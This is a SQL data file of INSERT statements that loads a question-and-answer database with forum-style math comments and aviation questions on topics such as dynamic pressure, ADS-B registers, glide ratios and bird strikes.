INSERT INTO postinstance (post_id, user_id, description) VALUES (147, 41, 'As to software: yes I use Pari/GP with a set of user-defined matrix-procedures, and a selfmade/homebrewn GUI which supports easy creation of outputs like that. (works in windows, but so far only with Pari/GP 2.2.11) If you like you can download from my homepage/software');
INSERT INTO answercomment (post_id, answer_id) VALUES (147, 132);
INSERT INTO activity (post_id, user_id, action) VALUES (147, 41, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (148, 5, '@PragyadityaDas : the sum-part in your formula (2) has the dot-product of the row of the Pascalmatrix (the sequence of $ \binom m0, \binom m1 ,...$) with the Bernoulli-numbers $b_k$ and because in (2) this is meant for any $m$ one can stack all that sum-terms below each other as the m&amp;#39;th row of a matrix-multiplication. But &amp;lt;upps&amp;gt; I see I have to correct my formula to relate it correctly to your (2). I missed the $ {1 \over m+1}$ - term.');
INSERT INTO answercomment (post_id, answer_id) VALUES (148, 132);
INSERT INTO activity (post_id, user_id, action) VALUES (148, 5, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (149, 9, 'The complete and rigorous development is  made by @especiallylime.');
INSERT INTO answercomment (post_id, answer_id) VALUES (149, 130);
INSERT INTO activity (post_id, user_id, action) VALUES (149, 9, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (150, 26, 'Also, I would like to know how did you manage to write this answer in this particular format? Did you use some software?');
INSERT INTO answercomment (post_id, answer_id) VALUES (150, 132);
INSERT INTO activity (post_id, user_id, action) VALUES (150, 26, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (151, 36, 'Can you start from the point where I left at &lt;code&gt;(2)&lt;/code&gt;? Your answer explains Bernoulli Number, but not how the particular writer got the result, as stated in my question.');
INSERT INTO answercomment (post_id, answer_id) VALUES (151, 132);
INSERT INTO activity (post_id, user_id, action) VALUES (151, 36, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (152, 11, '$G(z) \mapsto G(z^{-1})$ really means $g(n) \mapsto g(-n)$ and in general, of course the time-reversal doesn&amp;#39;t give the inverse system');
INSERT INTO answercomment (post_id, answer_id) VALUES (152, 125);
INSERT INTO activity (post_id, user_id, action) VALUES (152, 11, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (152, 11, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (153, 18, '@Shauna Goodman Fitzpatrick Just goggle about trigonometric integrals and you will a lot of examples.');
INSERT INTO answercomment (post_id, answer_id) VALUES (153, 134);
INSERT INTO activity (post_id, user_id, action) VALUES (153, 18, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (154, 2, 'Do you know of any good sources I could learn this about? I don&amp;#39;t understand where most of these lines are coming from');
INSERT INTO answercomment (post_id, answer_id) VALUES (154, 134);
INSERT INTO activity (post_id, user_id, action) VALUES (154, 2, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (155, 12, 'On second thoughts I discarded my answer, as the question explicitly asks for these changes of variable.');
INSERT INTO answercomment (post_id, answer_id) VALUES (155, 134);
INSERT INTO activity (post_id, user_id, action) VALUES (155, 12, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (156, 38, 'Can you please explain where you got x = 2θ?');
INSERT INTO answercomment (post_id, answer_id) VALUES (156, 134);
INSERT INTO activity (post_id, user_id, action) VALUES (156, 38, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (157, 17, 'I need to use the two substitutions given though');
INSERT INTO answercomment (post_id, answer_id) VALUES (157, 134);
INSERT INTO activity (post_id, user_id, action) VALUES (157, 17, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (158, 5, 'You&amp;#39;re right! Sorry, my bad.  I can&amp;#39;t believe that I got roles of t and tau mixed up.');
INSERT INTO answercomment (post_id, answer_id) VALUES (158, 141);
INSERT INTO activity (post_id, user_id, action) VALUES (158, 5, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (159, 5, '@Leonhard Euler Notice that $(A \cup B) \setminus A$ gives the elements of $B$ excluding the common elements between $B$ and $A$ i.e., equivalently this is $B \setminus A$. $B$ is written such a way to use the given hypotheses efficiently.');
INSERT INTO answercomment (post_id, answer_id) VALUES (159, 140);
INSERT INTO activity (post_id, user_id, action) VALUES (159, 5, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (160, 31, '@Leonhard Euler Draw in a  Venn Diagram and you will see it easily. Anyway, the comment of @ stud_iisc is a good start to work with.');
INSERT INTO answercomment (post_id, answer_id) VALUES (160, 136);
INSERT INTO activity (post_id, user_id, action) VALUES (160, 31, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (161, 37, '@Leonhard Euler Notice that $B \subseteq (A \cup B)$ and thus intersecting this with $B$ gives back $B$.');
INSERT INTO answercomment (post_id, answer_id) VALUES (161, 136);
INSERT INTO activity (post_id, user_id, action) VALUES (161, 37, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (162, 26, '&lt;a href=&quot;http://math.stackexchange.com/users/44376/%ce%98%ce%a3%ce%a6gensan&quot;&gt;math.stackexchange.com/users/44376/%ce%98%ce%a3%ce%a6gensan&lt;/a&gt;, from which relation did you get, $$B=B\cap (A\cup B)$$?');
INSERT INTO answercomment (post_id, answer_id) VALUES (162, 136);
INSERT INTO activity (post_id, user_id, action) VALUES (162, 26, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (163, 4, 'How did you write that $B=..$?');
INSERT INTO answercomment (post_id, answer_id) VALUES (163, 140);
INSERT INTO activity (post_id, user_id, action) VALUES (163, 4, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (164, 11, 'Is it not the case that $\frac{d^2y}{dt^2}=\frac1{\epsilon^2}\frac{d^2y}{d\tau^2}$ and $\frac{dy}{dt}=\frac1{\epsilon}\frac{dy}{d\tau}$, just like in this answer &lt;a href=&quot;http://math.stackexchange.com/a/1238312/285185&quot;&gt;math.stackexchange.com/a/1238312/285185&lt;/a&gt; only using $t=\epsilon\tau$ instead of $x=\kappa t$? Over there it says $\frac{d^2y}{dx^2} = \frac{1}{\kappa^2} \frac{d^2y}{dt^2}$ Is that answer wrong?');
INSERT INTO answercomment (post_id, answer_id) VALUES (164, 141);
INSERT INTO activity (post_id, user_id, action) VALUES (164, 11, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (164, 11, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (165, 34, 'Additional epsilon(s) should be found upstairs not downstairs as you divide by epsilon, you should multiply by an epsilon for each derivative wrt new variable tau! :)');
INSERT INTO answercomment (post_id, answer_id) VALUES (165, 141);
INSERT INTO activity (post_id, user_id, action) VALUES (165, 34, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (166, 8, 'I thought the y terms would get an extra $\frac1\epsilon$ per derivative. So it&amp;#39;d be $\epsilon \frac{y&amp;#39;&amp;#39;}{\epsilon^2} + (1 + \epsilon \tau)\frac{y&amp;#39;}{\epsilon} = 0$ and then just multiply through by $\epsilon$ to clear the denominators. Why do you think there is an extra epsilon in the first term but not the second? Can you &lt;a href=&quot;http://math.stackexchange.com/posts/2207595/edit&quot;&gt;edit&lt;/a&gt; to show how you know this is the correct new equation?');
INSERT INTO answercomment (post_id, answer_id) VALUES (166, 141);
INSERT INTO activity (post_id, user_id, action) VALUES (166, 8, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (166, 8, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (167, 37, 'edited and thanks!');
INSERT INTO answercomment (post_id, answer_id) VALUES (167, 128);
INSERT INTO activity (post_id, user_id, action) VALUES (167, 37, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (168, 32, '@Gibberish I am busy right now. Will do that in a few hours. In the meantime, please update your question');
INSERT INTO answercomment (post_id, answer_id) VALUES (168, 128);
INSERT INTO activity (post_id, user_id, action) VALUES (168, 32, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (168, 32, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (169, 44, 'for the lineariesed equations of motion i calculated $$2\theta_1 \dot \dot+\theta_2 \dot \dot=\frac{-2g}{l}\theta_1$$ and $$\theta_1 \dot \dot +\frac{2}{3}\theta_2\dot\dot=\frac{-2g}{l}\theta_2$$ These seem to give numerically unpleasant normal mode frequencies though, so I&amp;#39;m not entirely sure that they&amp;#39;re right. can you confirm or update your solution to this part?');
INSERT INTO answercomment (post_id, answer_id) VALUES (169, 128);
INSERT INTO activity (post_id, user_id, action) VALUES (169, 44, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (170, 37, 'i think best answer is this one');
INSERT INTO answercomment (post_id, answer_id) VALUES (170, 146);
INSERT INTO activity (post_id, user_id, action) VALUES (170, 37, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (171, 26, 'This seems to simply reiterate answers from long ago. If you have something new to add, please clarify your answer.');
INSERT INTO answercomment (post_id, answer_id) VALUES (171, 146);
INSERT INTO activity (post_id, user_id, action) VALUES (171, 26, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (171, 26, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (171, 26, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (172, 33, '&lt;p&gt;How exactly do you explain dynamic pressure? If someone asked me what the ASI reads, I would say it reads the dynamic pressure, which is the&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ram air pressure&lt;/strong&gt; (total pressure) - &lt;strong&gt;static pressure&lt;/strong&gt; = &lt;strong&gt;dynamic pressure&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;But would explaining dynamic pressure as &lt;strong&gt;&quot;the pressure the pitot tube experiences through the air&lt;/strong&gt;?&lt;/p&gt;

&lt;p&gt;As for static pressure, how would you explain that? Would you say static pressure is the pressure the aircraft feels whether it is in motion or not?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (172, 3, 'How can dynamic and static pressure be explained?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (172, 172, 33, 'Create');
INSERT INTO tag (text) VALUES ('aerodynamics');
INSERT INTO questiontag (question_id, tag_id) VALUES (172, 142);
INSERT INTO activity (post_id, user_id, action) VALUES (172, 33, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (172, 33, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (173, 47, '&lt;p&gt;ADS-B have two position squitters, airborne and surface. As far as i know, airborne position is broadcasted on air and surface position broadcasted on ground.&lt;/p&gt;

&lt;p&gt;There is a &quot;Squitter Capability Subfield&quot; in BDS Register 10, which needs to be set if both airborne and surface position registers are updated within last 10 seconds. This kinda implies both registers shall be updated all the times.&lt;/p&gt;

&lt;p&gt;Is providing data for both squitters necessary regardless of aircraft&#x27;s vertical status? Can we select one of these squitters and provide data only for it?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (173, 3, 'Providing data for Airborne Squitter on the ground(and vice versa)?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (173, 173, 47, 'Create');
INSERT INTO tag (text) VALUES ('ads-b');
INSERT INTO questiontag (question_id, tag_id) VALUES (173, 143);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (174, 12, '&lt;p&gt;What are the aerodynamic advantages of an m shaped wing? Why aren&#x27;t they used in aircrafts?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (174, 3, 'What are the aerodynamic advantages of an m-shaped wing?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (174, 174, 12, 'Create');
INSERT INTO tag (text) VALUES ('aircraft-design');
INSERT INTO questiontag (question_id, tag_id) VALUES (174, 144);
INSERT INTO questiontag (question_id, tag_id) VALUES (174, 142);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (175, 20, '&lt;p&gt;Transponders have registers for Mode S data and configuration. These registers are updated periodically to provide Mode S services such as ADS-B Airborne Position squitter.&lt;/p&gt;

&lt;p&gt;DO-260B and similar documents have Register Allocation Tables that states maximum update intervals for each register(if applicable).&lt;/p&gt;

&lt;p&gt;But there is also a register timeout mechanism that states &quot;if a register can not be updated within &lt;strong&gt;twice&lt;/strong&gt; the maximum update interval, it shall be zeroized&quot;. &lt;/p&gt;

&lt;p&gt;So, what happens if certain register is updated at every (1.5 * maxUpdateInterval) ? Are these maximum update times mere suggestions or is there another rule that forces us to update registers at most maximum update interval?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (175, 3, 'What does &quot;maximum update interval&quot; mean for Mode S GICB registers?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (175, 175, 20, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (175, 143);
INSERT INTO activity (post_id, user_id, action) VALUES (175, 20, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (175, 20, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (176, 23, '&lt;p&gt;When I was a kid, I used to read this comics about aircraft pilots in the 50&#x27;s, and in the operations center of their aircraft carrier, they had operators using markers on a glass wall to keep track of operations. Any idea how that was called and where I can find pictures of it? Is it still in use today, or is it now all computerized?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (176, 3, 'Where can I find more information about that glass board in old aircraft carrier operations centers?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (176, 176, 23, 'Create');
INSERT INTO tag (text) VALUES ('aircraft-carrier');
INSERT INTO questiontag (question_id, tag_id) VALUES (176, 145);
INSERT INTO activity (post_id, user_id, action) VALUES (176, 23, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (176, 23, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (177, 23, '&lt;p&gt;I watched an episode of Air Crash Investigation, which depicts a plane catching fire due to it shipping many expired oxygen generators for planes. The narrator says that a fire in the cargo hold is very unlikely, as the cargo hold is vacuumed, to prevent fire; but however in this situation, the oxygen generators were actually generating oxygen so the vacuum was futile. I also know they carry pets in the cargo hold. So are the cargo holds pressurized, non-pressurized, or vacuumed? Or does it depend on the carrier, or aircraft?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (177, 3, 'Are Cargo Holds Pressurized, Non-pressurized, or vacuumed?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (177, 177, 23, 'Create');
INSERT INTO tag (text) VALUES ('cargo');
INSERT INTO questiontag (question_id, tag_id) VALUES (177, 146);
INSERT INTO tag (text) VALUES ('fire');
INSERT INTO questiontag (question_id, tag_id) VALUES (177, 147);
INSERT INTO tag (text) VALUES ('oxygen');
INSERT INTO questiontag (question_id, tag_id) VALUES (177, 148);
INSERT INTO activity (post_id, user_id, action) VALUES (177, 23, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (178, 35, '&lt;p&gt;I&#x27;m filling out &lt;a href=&quot;https://foreflight.com/campaigns/9/&quot; rel=&quot;nofollow noreferrer&quot;&gt;ForeFlight&#x27;s new glide slope feature&lt;/a&gt;, and I&#x27;m trying to find the glide ratio for a Piper Archer II (PA-28-181). I know the best glide speed is 76, but can&#x27;t find the glide ratio. Any help on where to find this? &lt;/p&gt;

&lt;p&gt;Edit: &lt;/p&gt;

&lt;p&gt;Below is the glide range graph from my PoH, and below that is the information ForeFlight is asking for. I&#x27;m not really sure how to read that graph to get a glide slope number. &lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/P5cfu.png&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/P5cfu.png&quot; alt=&quot;enter image description here&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/s2498.png&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/s2498.png&quot; alt=&quot;enter image description here&quot;&gt;&lt;/a&gt;&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (178, 3, 'Where can I find (or how can I calculate) the glide ratio for a PA-28-181?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (178, 178, 35, 'Create');
INSERT INTO tag (text) VALUES ('glide-ratio');
INSERT INTO questiontag (question_id, tag_id) VALUES (178, 149);
INSERT INTO tag (text) VALUES ('piper-pa-28');
INSERT INTO questiontag (question_id, tag_id) VALUES (178, 150);
INSERT INTO tag (text) VALUES ('foreflight');
INSERT INTO questiontag (question_id, tag_id) VALUES (178, 151);
INSERT INTO activity (post_id, user_id, action) VALUES (178, 35, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (179, 45, '&lt;p&gt;I would like to know if VTOL UAVs necessarily need $n$ identical propellers and motors. Have any design solutions considered the possibility of using non identical props? For instance 2 motors of type A, 2 motors of type B, and 2 motors of type C. If so, where can I find some studies or some designs that have attempted this kind of solution?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (179, 3, 'Do all the engines/propellers of a VTOL UAV need to be identical?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (179, 179, 45, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (179, 144);
INSERT INTO tag (text) VALUES ('propeller');
INSERT INTO questiontag (question_id, tag_id) VALUES (179, 152);
INSERT INTO tag (text) VALUES ('unmanned-aerial-vehicle');
INSERT INTO questiontag (question_id, tag_id) VALUES (179, 153);
INSERT INTO tag (text) VALUES ('vtol');
INSERT INTO questiontag (question_id, tag_id) VALUES (179, 154);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (180, 8, '&lt;p&gt;I would like a clarification on bank angle and how its different from roll angle with respect to to fixed wing aircraft. It is my understanding that the bank angle is a result of rotating the aircraft body to the stability frame, implying that if the angle of attack $\alpha$ and the side slip angle $\beta$ are zero then, and only then the bank and angle and roll angle are the same. Based on Stevens and Lewis Aircraft Control and Simulation (which doesn&#x27;t define bank angle) the rotation from body to stability(wind) frame is given by
$$
C_{w-b} = \begin{bmatrix} &amp;amp;\cos\alpha \cos\beta &amp;amp; \sin\beta &amp;amp; \sin\alpha cos\beta \\ &amp;amp;-\cos\alpha\sin\beta &amp;amp; \cos\beta &amp;amp; -\sin\alpha\sin\beta\\ &amp;amp;-\sin\alpha &amp;amp; 0 &amp;amp; \cos\alpha  \end{bmatrix}
$$&lt;/p&gt;

&lt;p&gt;Therefore, the bank angle $\mu$ &lt;strong&gt;I think&lt;/strong&gt; is given by:
$$\mu \triangleq \begin{bmatrix} &amp;amp;\cos\alpha \cos\beta &amp;amp; \sin\beta &amp;amp; \sin\alpha \cos\beta \end{bmatrix} \begin{bmatrix} \phi \\ \theta \\ \psi\end{bmatrix} $$ &lt;/p&gt;

&lt;p&gt;where $\phi,\, \theta,\, \psi$ are standard aerospace Euler angles defined based on a 3-2-1 rotation.
My specific questions are:&lt;/p&gt;

&lt;p&gt;1) is my understanding and calculation of bank angle correct? If not can someone point me to a good resource for this. I was surprised to be able to find a clear definition and formula quickly.&lt;/p&gt;

&lt;p&gt;2) by multiplying the second and third row of $C_{w-b}$ with Euler angles we obtain a set of other two angles relative to stability frame. Do these angles have any names or specific role in aerospace dynamics/control?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (180, 3, 'How does bank angle differ from roll angle with respect to stability in fixed-wing aircraft?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (180, 180, 8, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (180, 142);
INSERT INTO tag (text) VALUES ('terminology');
INSERT INTO questiontag (question_id, tag_id) VALUES (180, 155);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (181, 43, '&lt;p&gt;What is the production status of the Pipistrel Panthera? They had plans to start production in 2016/2017 but nothing new has been published in the last two years.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (181, 3, 'What is the production status of the Pipistrel Panthera as of March 2017?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (181, 181, 43, 'Create');
INSERT INTO tag (text) VALUES ('new-airplane');
INSERT INTO questiontag (question_id, tag_id) VALUES (181, 156);
INSERT INTO activity (post_id, user_id, action) VALUES (181, 43, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (182, 37, '&lt;p&gt;Bird strikes are pretty well tested for planes, but what about helicopters?
Do they happen as frequent as planes and if so, what would be the possible outcomes?&lt;/p&gt;

&lt;p&gt;Do helicopter emergency procedures include a &quot;bird strike&quot; event?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (182, 3, 'How are bird stikes tested in helicopters?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (182, 182, 37, 'Create');
INSERT INTO tag (text) VALUES ('helicopter');
INSERT INTO questiontag (question_id, tag_id) VALUES (182, 157);
INSERT INTO tag (text) VALUES ('birds');
INSERT INTO questiontag (question_id, tag_id) VALUES (182, 158);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 1);
INSERT INTO postinstance (post_id, user_id, description) VALUES (183, 41, '&lt;p&gt;I am working on a small personal project that uses fuel burn data about specific aircraft to calculate the total fuel required for a trip. The data looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;          | 120000 kg  | 150000 kg | 180000kg
----------+------------+-----------+-----------
21,000 ft | 6250 kg/hr | 6350 kg/hr| 6450 kg/hr
22,000 ft | 6225 kg/hr | 6325 kg/hr| 6425 kg/hr
23,000 ft | 6200 kg/hr | 6300 kg/hr| 6400 kg/hr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Based on the table above, you can see that to cruise at 21,000 ft and a weight of 120,000 kg, you would burn 6250kg/hr. &lt;/p&gt;

&lt;p&gt;The problem I am having is that in order to calculate total weight, you first need to know total fuel, which you don&#x27;t have until you know the proper burn rate. What would be the proper way to calculate fuel based on this information?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (183, 3, 'How do you calculate trip fuel based on hourly fuel burn rates?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (183, 183, 41, 'Create');
INSERT INTO tag (text) VALUES ('flight-planning');
INSERT INTO questiontag (question_id, tag_id) VALUES (183, 159);
INSERT INTO tag (text) VALUES ('fuel');
INSERT INTO questiontag (question_id, tag_id) VALUES (183, 160);
INSERT INTO tag (text) VALUES ('performance-calculation');
INSERT INTO questiontag (question_id, tag_id) VALUES (183, 161);
INSERT INTO activity (post_id, user_id, action) VALUES (183, 41, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (183, 41, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (183, 41, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (184, 41, '&lt;p&gt;I would like to learn about the flight distance calculation and positional accuracy requirement in aviation.&lt;/p&gt;

&lt;p&gt;In practice, great circle distance is calculated between two airports but earth is more accurately represented with an ellipsoid and in this context, global positioning is based on WGS84 ellipsoid.&lt;/p&gt;

&lt;p&gt;Is it useful to calculate &lt;a href=&quot;https://en.wikipedia.org/wiki/Geodesics_on_an_ellipsoid&quot; rel=&quot;nofollow noreferrer&quot;&gt;geodesic&lt;/a&gt; (shortest path on the ellipsoid) rather than great circle on the sphere for more accurate estimation of the distance?&lt;/p&gt;

&lt;p&gt;When thinking that flight routes are 3D, are 3D distances calculated in flight planning? In addition, are these 3D distances calculated with elliposidal cartesian (ECEF) coordinates (X,Y,Z) regarding ellipsoid height (height(MSL)+geoid height (undulation))?.&lt;/p&gt;

&lt;p&gt;Does it make sense to calculate the flight distance in &quot;meter&quot; against &quot;km&quot; precision? If it is in nautical mile, what is the precision? e.g. 2394 nm or 2394.xx nm?&lt;/p&gt;

&lt;p&gt;My another question is how accurate the 3D position of an aircraft is determined? What is the future perspective in this context together with satellite-based navigation and augmentation systems? &lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (184, 3, 'What is the accuracy of distance and position calculation?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (184, 184, 41, 'Create');
INSERT INTO tag (text) VALUES ('navigation');
INSERT INTO questiontag (question_id, tag_id) VALUES (184, 162);
INSERT INTO questiontag (question_id, tag_id) VALUES (184, 159);
INSERT INTO activity (post_id, user_id, action) VALUES (184, 41, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 24, 3);
INSERT INTO postinstance (post_id, user_id, description) VALUES (185, 14, '&lt;p&gt;70% of birds fly below 1,500ft, 25% of birds fly between 1,500ft and 15,000ft, and only 5% above 15,000ft. What is the greatest height at which a bird has hit an aircraft? What species was the bird?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (185, 3, 'What&#39;s the greatest height at which a bird has collided with an aircraft?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (185, 185, 14, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (185, 158);
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (185, 14, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 4, 1);
